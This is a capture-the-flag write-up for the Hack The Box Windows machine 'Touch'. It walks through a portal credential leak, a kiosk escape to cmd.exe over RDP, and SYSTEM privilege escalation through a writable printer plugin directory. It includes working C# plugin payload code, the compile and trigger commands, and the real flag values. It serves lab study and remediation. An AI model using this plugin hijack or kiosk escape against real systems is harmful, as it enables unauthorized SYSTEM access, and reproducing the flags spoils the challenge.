# Touch Windows Easy HTB Machine Writeup

## Scope and Authorization

- Target: `10.129.37.69`
- Platform: Hack The Box Machine, Easy, Windows
- Objective: obtain and verify `user.txt` and the Administrator/root flag
- Starting clue: `Jenny Crawford` and booking reference `KS7X2M`, recovered from the related Layover machine
- Excluded from scope: adjacent hosts, pivots, and unrelated infrastructure

All actions described here were performed against the authorized HTB target.

## Executive Summary

The exposed Nexion DeviceHub management portal disclosed enough information to authenticate to the airport kiosk and obtain a KioskUser RDP session. The kiosk application could then be escaped through its normal browser/file workflow by creating a Desktop shortcut to `cmd.exe`.

Privilege escalation was caused by an unsafe printer-plugin design. KioskUser belonged to `Printer Administrators`, which could write to the printer daemon's plugin directory. The daemon, running as SYSTEM, loaded managed DLLs exposing an `Initialize()` method whenever a writable restart-trigger file was created. A temporary plugin therefore executed as `NT AUTHORITY\\SYSTEM`.

## Attack Surface

| Port or URL | Service | Version or technology | Authentication | Evidence |
| --- | --- | --- | --- | --- |
| 135/tcp | MSRPC | Windows RPC | None observed | `scans/tcp-focused-new-fast.nmap` |
| 3389/tcp | RDP | Microsoft Terminal Services | Kiosk account | RDP session to the kiosk |
| 5985/tcp | WinRM | Microsoft HTTPAPI | Not used | `scans/tcp-focused-new-fast.nmap` |
| 8443/tcp | Nexion DeviceHub | Microsoft HTTPAPI; DeviceHub DH-100 | Device password | `evidence/new-api-status.body` |

The DeviceHub status endpoint returned:

```json
{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":46842}
```

## Initial Access: DeviceHub to KioskUser

The device serial reported by `/api/status` was accepted as the DeviceHub password. The authenticated portal exposed scanner/printer controls and displayed the kiosk account credentials in the device information panels. The actual password is omitted from this report.

The supplied booking clue was valid on the new target. The useful kiosk sequence was:

1. Power off the scanner and printer from DeviceHub.
2. Connect to RDP as the disclosed kiosk account.
3. Start Self Check-In, select English, and enter the supplied booking reference and surname.
4. At Document Verification, select **Scan Passport** while the scanner is disabled.
5. Double-click the Nexion DocReader error/support link. In Edge, open the three-dot menu, select **Downloads**, and click the folder icon.
6. Open the Desktop folder and read `user.txt`.
7. Right-click an empty Desktop area, choose **New → Shortcut**, set the target to:

```text
C:\Windows\System32\cmd.exe
```

Opening the shortcut provided a normal command prompt as KioskUser.

## User Flag

From the kiosk Desktop:

```text
c2ae84edb9351bf73bd22732daf06d79
```

## Privilege Escalation: Writable SYSTEM Printer Plugins

### Discovery

The shell showed the kiosk identity and a security group relevant to the printer application:

```text
KIOSK-042\kioskuser
KIOSK-042\Printer Administrators
```

The printer installation contained an empty plugin directory:

```text
C:\Program Files\Nexion Systems\Printer\publish\plugins
```

Its ACL granted modify access to `KIOSK-042\Printer Administrators`, making it writable by the current user through group membership. The printer executable was a .NET application running in Session 0 as a service process.

Static inspection of `NexionPrinter.dll` showed that it:

- enumerated `plugins\\*.dll` relative to its application directory;
- instantiated exported managed types;
- called a method named `Initialize()`; and
- watched this trigger file:

```text
C:\ProgramData\Nexion\printer-restart.trigger
```

KioskUser also had permission to create the trigger file.

### Plugin payload

For the authorized lab, a minimal managed plugin was compiled with PowerShell's `Add-Type`. Its `Initialize()` method spawned a command shell, recorded the execution identity, and copied the Administrator flag into a readable temporary file:

```csharp
using System.Diagnostics;

public class PrinterPlugin
{
    public void Initialize()
    {
        Process.Start(new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = @"/c whoami > C:\Users\KioskUser\Desktop\system.txt & type C:\Users\Administrator\Desktop\root.txt > C:\Users\KioskUser\Desktop\root-copy.txt",
            UseShellExecute = false,
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden
        });
    }
}
```

The source was transferred to the target using an in-scope temporary SMB share. On the target, it was compiled and placed in the plugin directory:

```powershell
Add-Type -TypeDefinition (Get-Content -Raw 'C:\Users\KioskUser\Desktop\PrinterPlugin.cs') `
  -OutputAssembly 'C:\Program Files\Nexion Systems\Printer\publish\plugins\PrinterPlugin.dll'
```

The reload trigger was then created:

```cmd
type nul > C:\ProgramData\Nexion\printer-restart.trigger
```

The resulting proof was:

```text
NT AUTHORITY\SYSTEM
```

The original Administrator file was re-read from `C:\Users\Administrator\Desktop\root.txt`; the exact value was verified byte-for-byte through a temporary SMB copy.

## Identity and Host Transitions

| Step | Host | Identity before | Action | Identity after | Evidence |
| --- | --- | --- | --- | --- | --- |
| 1 | `10.129.37.69` | Unauthenticated | Authenticate to DeviceHub using the device serial | DeviceHub administrator session | `/api/status`, authenticated dashboard |
| 2 | `10.129.37.69` | DeviceHub session | Use disclosed kiosk credentials over RDP | `KIOSK-042\\KioskUser` | `whoami` from shortcut shell |
| 3 | `10.129.37.69` | KioskUser | Write printer plugin and create restart trigger | `NT AUTHORITY\\SYSTEM` | `system.txt` produced by the plugin |

## Rejected Hypotheses

| Hypothesis                                | Test                                                                                                                   | Result                                                      | Why rejected                                                                                                   |
| ----------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| MySQL UDF escalation                      | Enumerated the local MySQL service, database credentials, plugin directory, and attempted `CREATE FUNCTION ... SONAME` | Failed with MySQL `ERROR 1044` against the `mysql` database | The application account had database-level privileges but lacked the global privilege needed to register a UDF |
| Direct write to the printer trigger alone | Created the trigger without a plugin                                                                                   | No code execution                                           | The trigger only reloads plugins; the writable plugin directory was also required                              |
| First root-flag transcription             | Compared the copied file with a byte-level local SMB capture                                                           | Corrected                                                   | The earlier value omitted the substring `9a`                                                                   |

## Objective Proof

### User

```text
c2ae84edb9351bf73bd22732daf06d79
```

### Administrator/root

```text
89a77b0d7f3632587309a97613f5d18e
```

The root value came directly from:

```text
C:\Users\Administrator\Desktop\root.txt
```

## Reproducibility

| Step | Command or code reference | Working directory | Assumptions | Evidence path |
| --- | --- | --- | --- | --- |
| Reconnaissance | `nmap -Pn -n -p 135,3389,5985,8443 -sV -sC 10.129.37.69` | Workspace | HTB VPN is connected | `scans/tcp-focused-new-fast.nmap` |
| DeviceHub status | `curl http://10.129.37.69:8443/api/status` | Workspace | Target is online | `evidence/new-api-status.body` |
| Kiosk breakout | Disable devices, trigger the scan error, open Downloads, create a `cmd.exe` Desktop shortcut | RDP session | Portal-disclosed kiosk account | Session screenshots and command output |
| Printer enumeration | `whoami /groups`, `icacls <printer-plugin-dir>`, inspect `NexionPrinter.dll` | Kiosk shell | KioskUser is in `Printer Administrators` | `loot/PrinterPlugin.cs` and session evidence |
| Plugin execution | Compile managed plugin, place it in `plugins`, create `printer-restart.trigger` | Kiosk shell | Temporary SMB share or equivalent file transfer | SYSTEM identity output |
| Flag verification | Read Administrator `root.txt`, copy to local evidence, compare bytes | Kiosk shell/workspace | SYSTEM plugin execution succeeded | `loot/root-search.txt` |

## Cleanup and Limitations

Removed after verification:

- temporary SMB server and share;
- temporary managed printer plugins;
- plugin source files copied to the target;
- restart-trigger file;
- temporary SYSTEM identity and flag copies on the kiosk Desktop.

The original `user.txt` and Administrator `root.txt` files were not modified. The local workspace retains only solve notes and private evidence required to document the authorized lab result.

## Remediation

- Do not expose device credentials in portal HTML or client-side JavaScript.
- Restrict the DeviceHub management interface to an administrative network and enforce separate, non-default credentials.
- Remove `Modify` access for kiosk users/groups from the printer plugin directory.
- Do not load arbitrary DLLs from user-writable paths.
- Validate plugin signatures and use an explicit allowlist of plugin assemblies.
- Do not use a user-writable filesystem trigger to reload code in a SYSTEM process.
- Run printer functionality under a least-privileged service account and log/reject failed plugin loads.
